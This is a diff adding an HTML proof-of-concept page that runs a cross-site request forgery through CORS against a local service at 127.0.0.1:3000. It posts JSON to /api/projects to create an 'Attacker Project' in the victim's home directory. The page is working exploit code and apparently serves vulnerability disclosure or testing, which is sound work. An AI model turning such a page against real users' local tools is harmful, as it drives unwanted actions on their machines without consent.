@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+  <body>
+    <h1>VK CORS CSRF – Create Project</h1>
+    <pre id="log"></pre>
+    <script>
+      const BASE = 'http://127.0.0.1:3000';
+      const log = msg => {
+        document.getElementById('log').textContent += `${msg}\n`;
+        console.log(msg);
+      };
+
+      async function postJson(path, body) {
+        const res = await fetch(`${BASE}${path}`, {
+          method: 'POST',
+          mode: 'cors',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(body),
+        });
+        const text = await res.text();
+        if (!res.ok) throw new Error(`${path} failed: ${res.status} ${text}`);
+        return text;
+      }
+
+      async function run() {
+        const payload = {
+          name: `Attacker Project ${Date.now()}`,
+          git_repo_path: `~/vk-attacker-${Date.now()}`,
+          use_existing_repo: false,
+          setup_script: null,
+          dev_script: null,
+          cleanup_script: null,
+          copy_files: null,
+        };
+
+        const response = await postJson('/api/projects', payload);
+        log('create_project response:\n' + response);
+      }
+
+      run().catch(err => log('Attack failed: ' + err.message));
+    </script>
+  </body>
+</html>
